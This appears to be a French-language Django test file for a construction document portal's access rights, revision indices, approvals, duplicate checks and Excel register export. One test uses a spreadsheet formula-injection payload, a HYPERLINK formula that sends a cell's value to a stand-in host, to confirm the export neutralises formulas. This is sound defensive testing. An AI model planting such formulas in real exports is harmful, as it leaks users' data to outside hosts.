"""Corrections de la revue de l'étape 4 : droits, indices, visa, doublons, registre."""
import datetime
import io
import shutil
import tempfile
import zipfile
from pathlib import Path

from django.core.files.uploadedfile import SimpleUploadedFile
from django.test import TestCase, override_settings
from django.utils import timezone
from ninja.errors import HttpError

from . import tests as base  # module, pas la classe : ses tests ne sont pas relancés ici
from .droits import acteur_cabinet, acteur_intervenant
from .models import AvisVersion, Document, Intervenant, Version
from .services import _creer_version, viser

DOSSIER = tempfile.mkdtemp(prefix="application-ao-ged-revue-")
fichier = base.fichier
DOCUMENTS = "/api/ged/portail/documents"


def fichiers_sur_disque() -> list[Path]:
    return sorted(p for p in Path(DOSSIER).rglob("*") if p.is_file())


@override_settings(MEDIA_ROOT=DOSSIER, GED_DISQUE_LIBRE_MIN_GO=0, EMAIL_ACTIF=True, EMAIL_BACKEND="django.core.mail.backends.locmem.EmailBackend", GED_URL_PUBLIQUE="https://ged.cabinet.fr")
class RevueGedTests(TestCase):
    # Même chantier et mêmes utilitaires que les tests de la GED.
    setUp = base.GedTests.setUp
    json = base.GedTests.json
    poster = base.GedTests.poster
    ouvrir = base.GedTests.ouvrir
    portail = base.GedTests.portail
    url = base.GedTests.url
    refs = base.GedTests.refs

    @classmethod
    def tearDownClass(cls):
        super().tearDownClass()
        shutil.rmtree(DOSSIER, ignore_errors=True)

    def deposer_exe(self, client, **donnees):
        return self.poster(client, DOCUMENTS, {"fichier": fichier(), "zone": "LOT", "lot_id": self.lot08.pk, "categorie": "EXE", **donnees})

    def ajouter_sous_traitant(self) -> None:
        titulaire = Intervenant.objects.get(nom="Menuiseries Durand")
        st = self.json(self.client, "post", self.url("/intervenants"), {"nom": "Pose Express", "lot_ids": [self.lot08.pk], "sous_traitant_de": titulaire.pk,
                                                                        "personnes": [{"nom": "Poseur", "email": "pose@express.fr"}]}, attendu=201)
        self.codes["Pose Express"] = st["invitations"][0]["code"]

    # --- n° 1 : avis internes d'un indice remplacé avant visa -------------------------------
    def test_avis_internes_sur_un_indice_remplace(self):
        self.ouvrir()
        durand, martin, bet = self.portail("Menuiseries Durand"), self.portail("Plâtrerie Martin"), self.portail("BET Fluides")
        plan = self.deposer_exe(durand)
        version_a = plan["versions"][0]["id"]
        self.poster(bet, f"/api/ged/portail/versions/{version_a}/avis", {"avis": "REF", "observations": "Interne : note de calcul fausse", "fichier": fichier("avis.pdf")}, attendu=200)
        avis = AvisVersion.objects.get()
        # Nouvel indice avant le visa : A est remplacé et ne sera jamais visé, ses avis restent internes.
        self.poster(durand, f"{DOCUMENTS}/{plan['id']}/versions", {"fichier": fichier()})
        self.assertEqual(Version.objects.get(pk=version_a).visa, "REMPLACE")
        for client in (durand, martin):
            document = next(d for d in self.json(client, "get", DOCUMENTS) if d["id"] == plan["id"])
            self.assertEqual([v["avis"] for v in document["versions"]], [[], []])
            self.assertEqual(client.get(f"/api/ged/portail/avis/{avis.pk}/fichier").status_code, 404)
        self.assertEqual(bet.get(f"/api/ged/portail/avis/{avis.pk}/fichier").status_code, 200)

    # --- n° 2 : pas de pièce confidentielle dans le Commun ------------------------------------
    def test_piece_confidentielle_jamais_dans_le_commun(self):
        self.ouvrir()
        bet = self.portail("BET Fluides")
        self.poster(self.client, self.url("/documents"), {"fichier": fichier(), "zone": "COMMUN", "categorie": "SIT"}, attendu=400)
        self.poster(bet, DOCUMENTS, {"fichier": fichier(), "zone": "COMMUN", "categorie": "TS"}, attendu=400)
        marche = self.poster(self.client, self.url("/documents"), {"fichier": fichier("Devis.pdf"), "zone": "COMMUN", "categorie": "MAR"})
        self.json(self.client, "patch", self.url(f"/documents/{marche['id']}"), {"categorie": "TS"}, attendu=400)
        self.assertEqual(Document.objects.get(pk=marche["id"]).categorie, "MAR")
        # Dans le lot et en zone MOE, une pièce confidentielle reste permise.
        self.poster(self.client, self.url("/documents"), {"fichier": fichier(), "zone": "LOT", "lot_id": self.lot08.pk, "categorie": "SIT"})
        self.poster(self.client, self.url("/documents"), {"fichier": fichier(), "zone": "MOE", "categorie": "TS"})
        autre = self.poster(self.client, self.url("/documents"), {"fichier": fichier(), "zone": "LOT", "lot_id": self.lot08.pk, "categorie": "AUT"})
        self.json(self.client, "patch", self.url(f"/documents/{autre['id']}"), {"categorie": "TS"})
        self.assertEqual(self.refs(self.portail("Plâtrerie Martin")), ["COM-MAR-001"])

    # --- n° 3 : registre Excel sans formule -----------------------------------------------------
    def test_registre_sans_formule(self):
        from openpyxl import load_workbook

        self.ouvrir()
        durand = self.portail("Menuiseries Durand")
        self.deposer_exe(durand, titre='=HYPERLINK("https://x.example/?"&F5,"Voir")', reference_emetteur="=1+1", objet="=2+2")
        for client, url in ((self.client, self.url("/registre.xlsx")), (durand, "/api/ged/portail/registre.xlsx")):
            contenu = client.get(url).content
            self.assertNotIn("<f>", zipfile.ZipFile(io.BytesIO(contenu)).read("xl/worksheets/sheet1.xml").decode())
            valeurs = [c for ligne in load_workbook(io.BytesIO(contenu)).active.iter_rows(values_only=True) for c in ligne]
            for texte in ('=HYPERLINK("https://x.example/?"&F5,"Voir")', "=1+1", "=2+2"):
                self.assertIn(texte, valeurs)

    # --- n° 15 : un indice déjà visé ne l'est pas une seconde fois ------------------------------
    def test_visa_d_un_indice_deja_vise(self):
        self.ouvrir()
        plan = self.deposer_exe(self.portail("Menuiseries Durand"))
        version_id = plan["versions"][0]["id"]
        formulaire_ouvert = Version.objects.get(pk=version_id)  # chargé avant le premier visa
        self.poster(self.client, self.url(f"/versions/{version_id}/visa"), {"statut": "REF", "commentaire": "Non conforme au CCTP."}, attendu=200)
        fiche = Path(Version.objects.get(pk=version_id).fiche_visa.path)
        self.poster(self.client, self.url(f"/versions/{version_id}/visa"), {"statut": "VSO"}, attendu=409)
        with self.assertRaises(HttpError) as erreur:
            viser(acteur_cabinet(self.moe), formulaire_ouvert, statut="VSO")
        self.assertEqual(erreur.exception.status_code, 409)
        version = Version.objects.get(pk=version_id)
        self.assertEqual((version.visa, Path(version.fiche_visa.path)), ("REF", fiche))
        self.assertTrue(fiche.exists())

    # --- n° 16 : indice suivant calculé sur le plus haut indice ---------------------------------
    def test_indice_suivant_apres_un_indice_force(self):
        self.ouvrir()
        durand = self.portail("Menuiseries Durand")
        plan = self.deposer_exe(durand, indice="0")
        url = f"{DOCUMENTS}/{plan['id']}/versions"
        for _indice in "ABC":
            self.poster(durand, url, {"fichier": fichier()})
        self.poster(self.client, self.url(f"/documents/{plan['id']}/versions"), {"fichier": fichier(), "indice": "B1", "forcer": "Indice du cartouche"})
        # B2 suit le dernier dépôt (B1) mais reste inférieur à C : refusé à l'entreprise.
        erreur = self.poster(durand, url, {"fichier": fichier(), "indice": "B2"}, attendu=400)
        self.assertIn("indice C", erreur["detail"])
        suite = self.poster(durand, url, {"fichier": fichier()})
        self.assertEqual(suite["versions"][0]["indice"], "D")

    # --- n° 17 : lots conservés quand la modification est refusée -------------------------------
    def test_lots_conserves_apres_un_refus(self):
        self.ouvrir()
        durand = Intervenant.objects.get(nom="Menuiseries Durand")
        self.json(self.client, "patch", f"/api/ged/intervenants/{durand.pk}", {"lot_ids": []}, attendu=400)
        self.assertEqual(list(durand.lots.values_list("pk", flat=True)), [self.lot08.pk])

    # --- n° 7 et 18 : doublons dans le même lot et la même catégorie seulement ------------------
    def test_doublon_limite_au_lot_et_a_la_categorie(self):
        self.ouvrir()
        durand, martin = self.portail("Menuiseries Durand"), self.portail("Plâtrerie Martin")
        fiche = b"%PDF-1.4 fiche fabricant Velux GGL"
        ft = self.poster(durand, DOCUMENTS, {"fichier": SimpleUploadedFile("Velux.pdf", fiche), "zone": "LOT", "lot_id": self.lot08.pk, "categorie": "FT"})
        # Même fiche fabricant pour un autre lot, ou remise en DOE : acceptée.
        self.poster(martin, DOCUMENTS, {"fichier": SimpleUploadedFile("Velux.pdf", fiche), "zone": "LOT", "lot_id": self.lot11.pk, "categorie": "FT"})
        self.poster(durand, DOCUMENTS, {"fichier": SimpleUploadedFile("Velux DOE.pdf", fiche), "zone": "LOT", "lot_id": self.lot08.pk, "categorie": "DOE"})
        # Même lot et même catégorie, ou même document : refusé, la référence (visible) est citée.
        erreur = self.poster(durand, DOCUMENTS, {"fichier": SimpleUploadedFile("Velux 2.pdf", fiche), "zone": "LOT", "lot_id": self.lot08.pk, "categorie": "FT"}, attendu=409)
        self.assertIn("08-FT-001", erreur["detail"])
        self.poster(durand, f"{DOCUMENTS}/{ft['id']}/versions", {"fichier": SimpleUploadedFile("Velux B.pdf", fiche)}, attendu=409)
        # Un fichier de la zone MOE n'empêche pas le dépôt d'une entreprise et n'est jamais révélé.
        estimation = b"PK estimation confidentielle"
        self.poster(self.client, self.url("/documents"), {"fichier": SimpleUploadedFile("Estimation.xlsx", estimation), "zone": "MOE", "categorie": "AUT"})
        self.poster(durand, DOCUMENTS, {"fichier": SimpleUploadedFile("Estimation.xlsx", estimation), "zone": "LOT", "lot_id": self.lot08.pk, "categorie": "AUT"})
        with self.assertRaises(HttpError) as refus:
            _creer_version(acteur_intervenant(Intervenant.objects.get(nom="Menuiseries Durand")), Document.objects.get(zone="MOE"),
                           SimpleUploadedFile("Estimation.xlsx", estimation), "B", "", "INFO")
        self.assertEqual(refus.exception.status_code, 409)
        self.assertNotIn("MOE-", refus.exception.message)

    # --- n° 6 : un sous-traitant ne dépose pas de pièces chiffrées ------------------------------
    def test_sous_traitant_sans_pieces_chiffrees(self):
        self.ouvrir()
        self.ajouter_sous_traitant()
        pose = self.portail("Pose Express")
        droits = self.json(pose, "get", "/api/ged/portail/espace")["droits"]
        self.assertFalse({"OS", "AVT", "TS", "SIT", "ST"} & set(droits["categories_depot"]))
        self.assertIn("EXE", droits["categories_depot"])
        self.poster(pose, DOCUMENTS, {"fichier": fichier(), "zone": "LOT", "lot_id": self.lot08.pk, "categorie": "SIT"}, attendu=403)

    # --- n° 5 et 32 : pas de zone de dépôt sans catégorie permise --------------------------------
    def test_droits_de_depot_apres_reception(self):
        self.ouvrir()
        csps = self.json(self.client, "post", self.url("/intervenants"), {"nom": "Coordination SPS", "profil": "CSPS", "personnes": [{"nom": "Coordonnateur", "email": "sps@coord.fr"}]}, attendu=201)
        self.codes["Coordination SPS"] = csps["invitations"][0]["code"]
        ct, sps = self.portail("Bureau Véritas"), self.portail("Coordination SPS")
        self.json(self.client, "patch", self.url(), {"statut": "RECEPTION", "date_reception": "2027-06-30"})
        droits = self.json(ct, "get", "/api/ged/portail/espace")["droits"]
        self.assertEqual((droits["zones_depot"], droits["categories_depot"]), ([], []))
        droits = self.json(sps, "get", "/api/ged/portail/espace")["droits"]
        self.assertEqual((droits["zones_depot"], droits["categories_depot"]), (["COMMUN"], ["DIU"]))

    # --- n° 20 : pas de retard de visa pour un indice remplacé ou un document annulé -------------
    def test_registre_retard_de_visa(self):
        from openpyxl import load_workbook

        self.ouvrir()
        durand = self.portail("Menuiseries Durand")
        plan = self.deposer_exe(durand)
        self.poster(durand, f"{DOCUMENTS}/{plan['id']}/versions", {"fichier": fichier()})  # A remplacé par B avant visa
        Version.objects.update(echeance_visa=timezone.localdate() - datetime.timedelta(days=10))

        def retards():
            classeur = load_workbook(io.BytesIO(self.client.get(self.url("/registre.xlsx")).content))
            return {ligne[6]: ligne[14] or None for ligne in classeur.active.iter_rows(min_row=4, values_only=True)}

        self.assertEqual(retards(), {"B": 10, "A": None})
        self.json(self.client, "patch", self.url(f"/documents/{plan['id']}"), {"annule": True, "motif_annulation": "Doublon"})
        self.assertEqual(retards(), {"B": None, "A": None})

    # --- n° 22 : source refusée, aucun fichier laissé sur le disque ------------------------------
    def test_source_refusee_sans_fichier_orphelin(self):
        self.ouvrir()
        durand = self.portail("Menuiseries Durand")
        avant = fichiers_sur_disque()
        self.poster(durand, DOCUMENTS, {"fichier": fichier(), "zone": "LOT", "lot_id": self.lot08.pk, "categorie": "EXE", "sources": [fichier("plan.html", b"<html>")]}, attendu=400)
        self.assertEqual(fichiers_sur_disque(), avant)
        plan = self.deposer_exe(durand)
        avant = fichiers_sur_disque()
        self.poster(durand, f"{DOCUMENTS}/{plan['id']}/versions", {"fichier": fichier(), "sources": [fichier("plan.html", b"<html>")]}, attendu=400)
        self.assertEqual(fichiers_sur_disque(), avant)
